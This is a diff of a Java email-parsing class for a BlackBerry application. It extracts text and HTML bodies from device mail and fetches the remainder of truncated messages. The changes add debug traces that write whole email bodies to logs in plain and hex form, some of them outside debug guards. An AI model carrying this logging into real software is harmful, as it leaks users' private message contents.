@@ -12,213 +12,273 @@ import net.rim.blackberry.api.mail.TextBodyPart;
 import net.rim.blackberry.api.mail.Transport;
 import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
 import net.rim.blackberry.api.mail.BodyPart.ContentType;
+import net.rim.device.api.ui.text.HexadecimalTextFilter;
 import blackberry.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.utils.Check;
+import blackberry.utils.Utils;
 
 public class MailParser {
-    //#ifdef DEBUG
-    static Debug debug = new Debug("MailParser", DebugLevel.INFORMATION);
-    //#endif
+	//#ifdef DEBUG
+	static Debug debug = new Debug("MailParser", DebugLevel.VERBOSE);
+	//#endif
 
-    private final Message message;
-    private final Mail mail;
+	private final Message message;
+	private final Mail mail;
 
-    public MailParser(final Message message) {
-        this.message = message;
-        mail = new Mail();
-    }
+	public MailParser(final Message message) {
+		this.message = message;
+		mail = new Mail();
+	}
 
-    public final Mail parse() {
-        //#ifdef DBC
-        Check.requires(message != null, "parse: message != null");
-        //#endif
+	public final Mail parse() {
+		//#ifdef DBC
+		Check.requires(message != null, "parse: message != null");
+		//#endif
 
-        findEmailBody(message.getContent());
+		findEmailBody(message.getContent());
 
-        // HACK: se si vuole si puo' fare un override del body trovato
+		// HACK: se si vuole si puo' fare un override del body trovato
 
-        if (!mail.hasText()) {
-            //#ifdef DEBUG_WARN
-            debug.warn("Forcing bodytext");
-            //#endif
-            mail.plainTextMessageContentType = "text/plain; charset=UTF-8\r\n\r\n";
-            mail.plainTextMessage = message.getBodyText();
-        }
-        return mail;
-    }
+		if (!mail.hasText()) {
+			//#ifdef DEBUG_WARN
+			debug.warn("Forcing bodytext");
+			//#endif
+			mail.plainTextMessageContentType = "text/plain; charset=UTF-8\r\n\r\n";
+			mail.plainTextMessage = message.getBodyText();
+		}
+		
+		String content = message.getBodyText();
+		
+		debug.trace("plain content: " + content);
+		debug.trace("plain hex: " + Utils.byteArrayToHex(content.getBytes()));
 
-    private void findEmailBody(final Object obj) {
-        //Reset the attachment flags.
-        mail.hasSupportedAttachment = false;
-        mail.hasUnsupportedAttachment = false;
-        if (obj instanceof Multipart) {
-            final Multipart mp = (Multipart) obj;
-            for (int count = 0; count < mp.getCount(); ++count) {
-                findEmailBody(mp.getBodyPart(count));
-            }
-        } else if (obj instanceof TextBodyPart) {
-            final TextBodyPart tbp = (TextBodyPart) obj;
-            readEmailBody(tbp);
-        } else if (obj instanceof MimeBodyPart) {
-            final MimeBodyPart mbp = (MimeBodyPart) obj;
-            if (mbp.getContentType().indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
-                readEmailBody(mbp);
-            }
+		try {
+			debug.trace("plain iso: "
+					+ Utils.byteArrayToHex(content.getBytes("ISO-8859-1")));
+			debug.trace("plain UTF8: "
+					+ Utils.byteArrayToHex(content.getBytes("UTF-8")));
+		} catch (UnsupportedEncodingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 
-            else if (mbp.getContentType().equals(
-                    ContentType.TYPE_MULTIPART_MIXED_STRING)
-                    || mbp.getContentType().equals(
-                            ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
-                //The message has attachments or we are at the top level of the message.
-                //Extract all of the parts within the MimeBodyPart message.
-                findEmailBody(mbp.getContent());
-            }
-        } else if (obj instanceof SupportedAttachmentPart) {
-            mail.hasSupportedAttachment = true;
-        } else if (obj instanceof UnsupportedAttachmentPart) {
-            mail.hasUnsupportedAttachment = true;
-        }
-    }
+		
+		return mail;
+	}
 
-    /**
-     * MimeBodyPart text/html
-     * 
-     * @param mbp
-     */
-    private void readEmailBody(final MimeBodyPart mbp) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("readEmailBody: MimeBodyPart");
-        //#endif
-        //Extract the content of the message.
-        final Object obj = mbp.getContent();
-        final String mimeType = mbp.getContentType();
+	private void findEmailBody(final Object obj) {
+		//Reset the attachment flags.
+		mail.hasSupportedAttachment = false;
+		mail.hasUnsupportedAttachment = false;
+		if (obj instanceof Multipart) {
+			//#ifdef DEBUG_TRACE
+			debug.trace("Multipart");
+			//#endif
+			final Multipart mp = (Multipart) obj;
+			for (int count = 0; count < mp.getCount(); ++count) {
+				findEmailBody(mp.getBodyPart(count));
+			}
+		} else if (obj instanceof TextBodyPart) {
+			//#ifdef DEBUG_TRACE
+			debug.trace("TextBodyPart");
+			//#endif
+			final TextBodyPart tbp = (TextBodyPart) obj;
+			readEmailBody(tbp);
+		} else if (obj instanceof MimeBodyPart) {
+			//#ifdef DEBUG_TRACE
+			debug.trace("MimeBodyPart");
+			//#endif
+			final MimeBodyPart mbp = (MimeBodyPart) obj;
+			if (mbp.getContentType().indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
+				readEmailBody(mbp);
+			}
 
-        //String encoding = "UTF-8"; // "ISO-8859-1", "UTF-16LE" ... 
-        try {
-            //TODO: aggiungere automaticamente headers.
-            Enumeration enumeration = mbp.getAllHeaders();
-            while (enumeration.hasMoreElements()) {
+			else if (mbp.getContentType().equals(
+					ContentType.TYPE_MULTIPART_MIXED_STRING)
+					|| mbp.getContentType().equals(
+							ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
+				//The message has attachments or we are at the top level of the message.
+				//Extract all of the parts within the MimeBodyPart message.
+				findEmailBody(mbp.getContent());
+			} else {
+				//#ifdef DEBUG_TRACE
+				debug.trace("strange mime: " + mbp.getContentType());
+				//#endif
+			}
+		} else if (obj instanceof SupportedAttachmentPart) {
+			mail.hasSupportedAttachment = true;
+		} else if (obj instanceof UnsupportedAttachmentPart) {
+			mail.hasUnsupportedAttachment = true;
+		}
+	}
 
-                Object headerObject = enumeration.nextElement();
+	/**
+	 * MimeBodyPart text/html
+	 * 
+	 * @param mbp
+	 */
+	private void readEmailBody(final MimeBodyPart mbp) {
+		//#ifdef DEBUG_TRACE
+		debug.trace("readEmailBody: MimeBodyPart");
+		//#endif
+		//Extract the content of the message.
+		final Object obj = mbp.getContent();
+		final String mimeType = mbp.getContentType();
 
-                if (headerObject instanceof String) {
-                    String header = (String) headerObject;
+		//String encoding = "UTF-8"; // "ISO-8859-1", "UTF-16LE" ... 
+		try {
+			// aggiunge automaticamente headers.
+			Enumeration enumeration = mbp.getAllHeaders();
+			while (enumeration.hasMoreElements()) {
 
-                    //#ifdef DEBUG_TRACE
-                    debug.trace("readEmailBody HEADER: " + header + " = "
-                            + header);
-                    //#endif
+				Object headerObject = enumeration.nextElement();
 
-                } else {
-                    //#ifdef DEBUG_ERROR
+				if (headerObject instanceof String) {
+					String header = (String) headerObject;
 
-                    debug.error("readEmailBody HEADER: "
-                            + headerObject.getClass().getName() + " tostring: "
-                            + headerObject.toString());
-                    //#endif
-                }
-            }
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
-            debug.error(ex);
-            //#endif
-        }
+					//#ifdef DEBUG_TRACE
+					debug.trace("readEmailBody HEADER: " + header + " = "
+							+ header);
+					//#endif
 
-        String body = null;
+				} else {
+					//#ifdef DEBUG_ERROR
 
-        // generazione del body
-        if (obj instanceof String) {
-            //#ifdef DEBUG_TRACE
-            debug.trace("readEmailBody: from String");
-            //#endif
-            body = (String) obj;
-        } else if (obj instanceof byte[]) {
-            //#ifdef DEBUG_TRACE
-            debug.trace("readEmailBody: from byte[]");
-            //#endif
-            //Usare la codifica latin1 per garantire la lettura 1 byte alla volta
-            try {
-                body = new String((byte[]) obj, "ISO-8859-1");
-            } catch (UnsupportedEncodingException e) {
-                //#ifdef DEBUG_ERROR
-                debug.error(e);
-                //#endif
-            }
-        }
+					debug.error("readEmailBody HEADER: "
+							+ headerObject.getClass().getName() + " tostring: "
+							+ headerObject.toString());
+					//#endif
+				}
+			}
+		} catch (Exception ex) {
+			//#ifdef DEBUG_ERROR
+			debug.error(ex);
+			//#endif
+		}
 
-        if (mimeType.indexOf(ContentType.TYPE_TEXT_PLAIN_STRING) != -1) {
-            mail.plainTextMessageContentType = "Content-Type: " + mimeType
-                    + "\r\n\r\n";
-            mail.plainTextMessage = body;
-            //Determine if all of the text body part is present.
-            if (mbp.hasMore() && !mbp.moreRequestSent()) {
-                try {
-                    //#ifdef DEBUG_INFO
-                    debug.info("There's more text: " + Conf.FETCH_WHOLE_EMAIL);
-                    //#endif
-                    if (Conf.FETCH_WHOLE_EMAIL) {
-                        Transport.more(mbp, true);
-                    }
-                } catch (final Exception ex) {
-                    //#ifdef DEBUG_ERROR
-                    debug.error("readEmailBody Mime Text: " + ex);
-                    //#endif
-                }
-            }
-        } else if (mimeType.indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
-            mail.htmlMessageContentType = "Content-Type: " + mimeType
-                    + "\r\n\r\n";
-            mail.htmlMessage = body;
-            //Determine if all of the HTML body part is present.
-            if (mbp.hasMore() && !mbp.moreRequestSent()) {
-                try {
-                    //#ifdef DEBUG_INFO
-                    debug.info("There's more html: " + Conf.FETCH_WHOLE_EMAIL);
-                    //#endif
-                    if (Conf.FETCH_WHOLE_EMAIL) {
-                        Transport.more(mbp, true);
-                    }
-                } catch (final Exception ex) {
-                    //#ifdef DEBUG_ERROR
-                    debug.error("readEmailBody Mime Html: " + ex);
-                    //#endif
-                }
-            }
-        }
-    }
+		String body = null;
 
-    /**
-     * text/plain
-     * 
-     * @param tbp
-     */
-    private void readEmailBody(final TextBodyPart tbp) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("readEmailBody: TextBodyPart");
-        //#endif
+		// generazione del body
+		if (obj instanceof String) {
+			//#ifdef DEBUG_TRACE
+			debug.trace("readEmailBody: from String");
+			//#endif
+			body = (String) obj;
+		} else if (obj instanceof byte[]) {
+			//#ifdef DEBUG_TRACE
+			debug.trace("readEmailBody: from byte[]");
+			//#endif
+			//Usare la codifica latin1 per garantire la lettura 1 byte alla volta
+			try {
+				body = new String((byte[]) obj, "ISO-8859-1");
+			} catch (UnsupportedEncodingException e) {
+				//#ifdef DEBUG_ERROR
+				debug.error(e);
+				//#endif
+			}
+		}
 
-        String mimeType = tbp.getContentType();
-        mail.plainTextMessageContentType = "Content-Type: " + mimeType
-                + "\r\n\r\n";
+		if (mimeType.indexOf(ContentType.TYPE_TEXT_PLAIN_STRING) != -1) {
+			mail.plainTextMessageContentType = "Content-Type: " + mimeType
+					+ "\r\n\r\n";
+			mail.plainTextMessage = body;
+			//Determine if all of the text body part is present.
+			if (mbp.hasMore() && !mbp.moreRequestSent()) {
+				try {
+					//#ifdef DEBUG_INFO
+					debug.info("There's more text: " + Conf.FETCH_WHOLE_EMAIL);
+					//#endif
+					if (Conf.FETCH_WHOLE_EMAIL) {
+						Transport.more(mbp, true);
+					}
+				} catch (final Exception ex) {
+					//#ifdef DEBUG_ERROR
+					debug.error("readEmailBody Mime Text: " + ex);
+					//#endif
+				}
+			}
+		} else if (mimeType.indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
+			mail.htmlMessageContentType = "Content-Type: " + mimeType
+					+ "\r\n\r\n";
+			mail.htmlMessage = body;
+			//Determine if all of the HTML body part is present.
+			if (mbp.hasMore() && !mbp.moreRequestSent()) {
+				try {
+					//#ifdef DEBUG_INFO
+					debug.info("There's more html: " + Conf.FETCH_WHOLE_EMAIL);
+					//#endif
+					if (Conf.FETCH_WHOLE_EMAIL) {
+						Transport.more(mbp, true);
+					}
+				} catch (final Exception ex) {
+					//#ifdef DEBUG_ERROR
+					debug.error("readEmailBody Mime Html: " + ex);
+					//#endif
+				}
+			}
+		} else {
+			//#ifdef DEBUG_INFO
+			debug.info("unknown mimeType: " + mimeType);
+			//#endif
+		}
+	}
 
-        if (mail.plainTextMessage == null) {
-            mail.plainTextMessage = (String) tbp.getContent();
-        } else {
-            mail.plainTextMessage += "\r\n\r\n" + (String) tbp.getContent();
-        }
+	/**
+	 * text/plain
+	 * 
+	 * @param tbp
+	 */
+	private void readEmailBody(final TextBodyPart tbp) {
+		//#ifdef DEBUG_TRACE
+		debug.trace("readEmailBody: TextBodyPart");
+		//#endif
 
-        if (tbp.hasMore() && !tbp.moreRequestSent()) {
-            try {
-                if (Conf.FETCH_WHOLE_EMAIL) {
-                    Transport.more(tbp, true);
-                }
-            } catch (final Exception ex) {
-                //#ifdef DEBUG_ERROR
-                debug.error("readEmailBody Text: " + ex);
-                //#endif
-            }
-        }
-    }
+		String mimeType = tbp.getContentType();
+		if (Conf.MAIL_TEXT_FORCE_UTF8) {
+			mimeType = "text/plain; charset=UTF-8";
+		}
+
+		mail.plainTextMessageContentType = "Content-Type: " + mimeType
+				+ "\r\n\r\n";
+
+		String content = (String) tbp.getContent();
+
+		//#ifdef DEBUG_TRACE
+		debug.trace("mail.plainTextMessageContentType: "
+				+ mail.plainTextMessageContentType);
+
+		debug.trace("content: " + content);
+		debug.trace("hex: " + Utils.byteArrayToHex(content.getBytes()));
+
+		try {
+			debug.trace("iso: "
+					+ Utils.byteArrayToHex(content.getBytes("ISO-8859-1")));
+			debug.trace("UTF8: "
+					+ Utils.byteArrayToHex(content.getBytes("UTF-8")));
+		} catch (UnsupportedEncodingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		//#endif
+
+		if (mail.plainTextMessage == null) {
+			mail.plainTextMessage = content;
+		} else {
+			mail.plainTextMessage += "\r\n\r\n" + content;
+		}
+
+		if (tbp.hasMore() && !tbp.moreRequestSent()) {
+			try {
+				if (Conf.FETCH_WHOLE_EMAIL) {
+					Transport.more(tbp, true);
+				}
+			} catch (final Exception ex) {
+				//#ifdef DEBUG_ERROR
+				debug.error("readEmailBody Text: " + ex);
+				//#endif
+			}
+		}
+	}
 }
